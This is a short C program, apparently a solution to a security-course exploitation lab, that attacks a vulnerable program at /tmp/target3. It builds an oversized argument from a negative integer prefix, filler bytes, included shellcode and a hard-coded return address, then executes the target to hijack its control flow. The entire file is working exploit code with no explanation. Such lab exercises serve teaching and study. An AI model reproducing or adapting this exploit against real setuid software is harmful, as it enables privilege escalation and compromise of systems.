#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

int main(void)
{
  char *args[3];
  char *env[1];
  
  char input[4819];
  
  strcpy(input, "-214748124,");
  int i;
  for (i = 1 ; i <= 4797 - strlen(shellcode) ; i++) {
      strcat(input, "f");
  }
  strcat(input, shellcode);
  for (i = 1 ; i <= 7 ; i ++) {
     strcat(input, "f");
  }
  
  input[4815] = '\x58';
  input[4816] = '\xeb';
  input[4817] = '\xff';
  input[4818] = '\xbf';

  args[0] = TARGET; args[1] = input; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
